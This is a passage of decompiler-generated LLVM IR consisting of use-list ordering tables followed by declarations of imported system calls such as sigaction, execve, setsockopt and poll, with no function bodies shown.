155, 154, 268, 1981, 1982, 1983, 1984, 1986, 1985, 716, 720, 1406, 1407, 1408, 156, 202, 157, 158, 159, 472, 1409, 1410, 160, 189, 718, 719, 161, 190, 721, 722, 717, 473, 723, 1411, 724, 1412, 1413, 1414, 1416, 481, 1415, 1417, 1418, 727, 728, 725, 726, 1419, 733, 729, 730, 731, 1430, 732, 734, 1431, 1432, 1433, 735, 1434, 269, 1435, 162, 477, 476, 1436, 1437, 163, 475, 474, 1438, 164, 165, 166, 167, 168, 169, 170, 736, 1439, 737, 1440, 1441, 738, 739, 1442, 740, 525, 1444, 1445, 526, 1446, 1448, 171, 191, 1447, 527, 742, 1460, 741, 1461, 1462, 433, 744, 745, 1466, 1467, 746, 1468, 747, 748, 743, 478, 749, 1469, 1472, 172, 192, 173, 1473, 1474, 434, 174, 1481, 750, 1655, 1657, 1658, 543, 1659, 1660, 544, 1661, 1662, 545, 1663, 1664, 546, 1665, 1666, 547, 1667, 1668, 548, 1669, 1670, 2277, 1671, 1028, 1029, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 2278, 2279, 2280, 2281, 2282, 2283, 2284, 2285, 2286, 2287, 2288, 2289, 2290, 2291, 2292 }
  uselistorder i32* @r4, { 228, 1007, 1009, 18, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 229, 230, 1020, 231, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 801, 6, 802, 803, 5, 804, 805, 806, 20, 807, 19, 808, 809, 810, 315, 76, 77, 78, 79, 316, 317, 318, 319, 320, 325, 326, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 321, 21, 322, 323, 324, 1097, 1098, 811, 814, 817, 818, 819, 820, 821, 812, 813, 815, 816, 22, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 837, 836, 838, 839, 840, 841, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 23, 25, 256, 24, 257, 260, 258, 259, 842, 843, 844, 845, 2, 846, 847, 848, 849, 850, 851, 852, 855, 853, 854, 63, 272, 273, 274, 275, 276, 277, 261, 332, 333, 334, 335, 327, 328, 1242, 1234, 1235, 1236, 26, 1241, 1099, 1102, 1103, 1104, 1107, 1108, 278, 279, 280, 281, 290, 291, 292, 1109, 1130, 1131, 1132, 109, 110, 856, 857, 858, 859, 860, 27, 28, 1096, 1133, 1134, 861, 862, 29, 863, 864, 865, 866, 867, 868, 30, 869, 870, 871, 872, 873, 874, 875, 1135, 1136, 876, 877, 878, 879, 880, 881, 884, 885, 886, 1137, 1138, 1139, 1140, 559, 560, 561, 562, 563, 262, 263, 1141, 1142, 1143, 1144, 1145, 387, 388, 389, 390, 391, 392, 887, 898, 897, 900, 899, 8, 902, 901, 903, 7, 950, 951, 952, 953, 954, 955, 956, 957, 958, 31, 959, 960, 961, 962, 965, 968, 972, 973, 974, 975, 976, 977, 978, 979, 111, 112, 113, 114, 115, 116, 1110, 1111, 1112, 1113, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 282, 283, 284, 285, 32, 286, 287, 288, 289, 357, 1114, 1115, 1116, 1117, 1118, 264, 265, 266, 267, 268, 269, 270, 1146, 1147, 271, 293, 294, 295, 296, 339, 340, 297, 298, 299, 300, 301, 302, 303, 304, 305, 308, 306, 33, 307, 309, 310, 311, 312, 313, 314, 329, 330, 331, 1243, 1244, 1245, 1250, 70, 336, 9, 337, 338, 341, 34, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 1246, 1247, 1248, 1249, 352, 353, 354, 355, 356, 1127, 1128, 1129, 358, 359, 360, 361, 362, 363, 364, 365, 366, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 367, 368, 369, 370, 371, 372, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1165, 117, 118, 119, 120, 121, 35, 122, 123, 124, 125, 36, 126, 127, 128, 373, 374, 375, 1166, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1232, 1233, 376, 378, 379, 377, 380, 381, 382, 383, 384, 385, 386, 1251, 1252, 1272, 644, 645, 646, 647, 648, 649, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1273, 1274, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 904, 905, 906, 907, 908, 918, 919, 37, 920, 921, 80, 1033, 1196, 1197, 1198, 38, 1199, 1200, 1201, 1202, 39, 1203, 1204, 1205, 40, 1206, 1207, 1208, 1209, 1210, 1211, 11, 1219, 0, 1220, 1221, 41, 1212, 1213, 1214, 1215, 1216, 1034, 1, 1291, 1292, 1293, 1294, 1295, 1296, 393, 564, 565, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1253, 1271, 1384, 1385, 1386, 1389, 71, 1397, 64, 1379, 1380, 1381, 1382, 1383, 1310, 1311, 1312, 698, 699, 700, 701, 702, 703, 704, 705, 566, 567, 1313, 1314, 731, 732, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 650, 651, 652, 653, 654, 770, 771, 413, 414, 415, 655, 656, 657, 658, 410, 411, 412, 416, 417, 418, 772, 773, 774, 775, 1378, 1327, 1328, 1254, 42, 659, 660, 661, 662, 663, 43, 664, 44, 665, 666, 1329, 45, 46, 1331, 1332, 1333, 1334, 1335, 1336, 1255, 1256, 1269, 1270, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 598, 599, 600, 601, 1239, 1240, 1167, 1168, 720, 721, 722, 419, 969, 420, 421, 422, 423, 424, 963, 964, 747, 748, 970, 971, 1100, 1101, 749, 980, 981, 982, 983, 984, 985, 47, 986, 987, 988, 989, 990, 991, 992, 1390, 1391, 1392, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 922, 923, 924, 925, 926, 927, 928, 929, 909, 914, 915, 916, 917, 910, 911, 3, 912, 913, 1229, 48, 1230, 1231, 930, 49, 931, 932, 667, 50, 668, 669, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1064, 1063, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 51, 1072, 1073, 1074, 1080, 1081, 1082, 1083, 4, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 52, 1091, 53, 1092, 1093, 1094, 1095, 129, 130, 131, 1075, 1077, 1076, 1078, 1079, 1217, 1218, 425, 72, 426, 427, 428, 429, 430, 431, 432, 433, 65, 434, 1393, 1394, 1395, 1396, 933, 934, 935, 936, 937, 938, 939, 940, 941, 54, 942, 55, 943, 944, 945, 946, 947, 948, 949, 993, 994, 995, 996, 888, 889, 890, 891, 892, 893, 894, 56, 57, 895, 896, 1337, 1338, 670, 671, 733, 734, 1339, 1340, 1376, 1377, 17, 568, 750, 751, 1341, 637, 638, 518, 519, 520, 521, 513, 514, 639, 640, 882, 883, 435, 436, 437, 438, 439, 444, 440, 441, 442, 443, 966, 967, 569, 445, 1342, 1343, 618, 619, 446, 459, 460, 1344, 1345, 1163, 1164, 570, 571, 672, 673, 1105, 1106, 1387, 1388, 674, 675, 676, 58, 677, 678, 679, 680, 447, 782, 1237, 1238, 1315, 602, 1316, 59, 1317, 1318, 1319, 1320, 448, 449, 73, 450, 451, 66, 452, 453, 454, 455, 456, 457, 1346, 1347, 1348, 458, 1297, 1298, 461, 462, 463, 467, 464, 465, 466, 468, 469, 132, 133, 134, 135, 470, 12, 81, 82, 83, 84, 85, 86, 60, 87, 88, 89, 783, 784, 785, 90, 91, 61, 92, 93, 471, 95, 100, 96, 97, 94, 98, 99, 1330, 472, 473, 474, 475, 476, 481, 1352, 1353, 1356, 1357, 477, 478, 479, 480, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 13, 492, 493, 494, 495, 496, 14, 501, 502, 497, 498, 499, 500, 503, 504, 505, 506, 507, 1358, 1359, 1360, 508, 509, 510, 136, 137, 138, 139, 511, 512, 1354, 1355, 515, 516, 517, 522, 523, 524, 525, 526, 140, 141, 142, 527, 528, 529, 572, 573, 574, 575, 576, 577, 578, 584, 579, 580, 581, 582, 583, 530, 531, 532, 786, 787, 788, 789, 790, 791, 792, 793, 533, 534, 535, 536, 537, 1349, 1350, 1351, 603, 604, 605, 752, 753, 754, 755, 756, 757, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 1361, 1362, 1363, 1364, 1365, 1366, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 681, 682, 683, 684, 685, 686, 997, 998, 999, 1000, 1001, 1002, 758, 759, 760, 761, 762, 763, 735, 736, 737, 738, 739, 740, 764, 765, 766, 767, 768, 769, 201, 202, 203, 204, 205, 206, 207, 208, 741, 742, 743, 744, 745, 746, 209, 210, 211, 212, 723, 724, 725, 726, 727, 728, 538, 539, 67, 540, 541, 542, 543, 544, 548, 549, 550, 551, 545, 546, 547, 1368, 1367, 552, 1369, 1370, 1373, 1374, 1375, 1371, 1372, 553, 554, 74, 555, 556, 557, 558, 1321, 1322, 1323, 1324, 1325, 1326, 213, 214, 215, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 606, 607, 608, 15, 613, 609, 610, 611, 612, 614, 615, 616, 617, 794, 795, 796, 799, 800, 797, 798, 75, 62, 10, 101, 102, 103, 104, 105, 68, 106, 107, 108, 16, 620, 635, 636, 621, 629, 630, 631, 622, 623, 624, 69, 625, 627, 626, 628, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 632, 633, 634, 641, 642, 643, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 729, 730, 776, 777, 778, 779, 780, 781, 1003, 1004, 1005, 1006, 227, 1008 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @setrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @sigsuspend(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
